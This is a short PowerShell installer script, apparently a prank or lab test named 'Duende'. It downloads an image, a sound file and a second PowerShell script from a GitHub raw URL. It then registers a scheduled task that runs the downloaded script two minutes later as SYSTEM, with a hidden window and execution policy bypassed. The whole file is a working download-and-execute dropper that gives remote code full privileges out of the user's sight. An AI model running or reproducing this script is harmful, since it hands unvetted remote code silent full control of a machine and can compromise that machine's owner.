$ErrorActionPreference = "Stop"

$folder = "C:\DuendePrueba"
New-Item -ItemType Directory -Force -Path $folder | Out-Null

$imageUrl  = "https://raw.githubusercontent.com/bafool24/Duende/main/LabboxDuende/duende.png"
$soundUrl  = "https://raw.githubusercontent.com/bafool24/Duende/main/LabboxDuende/duende.wav"
$scriptUrl = "https://raw.githubusercontent.com/bafool24/Duende/main/LabboxDuende/duende_clean.ps1"

$imagePath = "$folder\duende.png"
$soundPath = "$folder\duende.wav"
$scriptPath = "$folder\duende.ps1"

Invoke-WebRequest -Uri $imageUrl -OutFile $imagePath -UseBasicParsing
Invoke-WebRequest -Uri $soundUrl -OutFile $soundPath -UseBasicParsing
Invoke-WebRequest -Uri $scriptUrl -OutFile $scriptPath -UseBasicParsing

# Crear tarea programada
$action = New-ScheduledTaskAction -Execute "powershell.exe" `
    -Argument "-ExecutionPolicy Bypass -WindowStyle Hidden -NoProfile -File `"$scriptPath`""

$trigger = New-ScheduledTaskTrigger -Once -At (Get-Date).AddMinutes(2)

$principal = New-ScheduledTaskPrincipal -UserId "S-1-5-18" -RunLevel Highest -LogonType ServiceAccount

Register-ScheduledTask -TaskName "DuendePrueba" -Action $action -Trigger $trigger -Principal $principal -Force

Write-Host "Instalación completada."
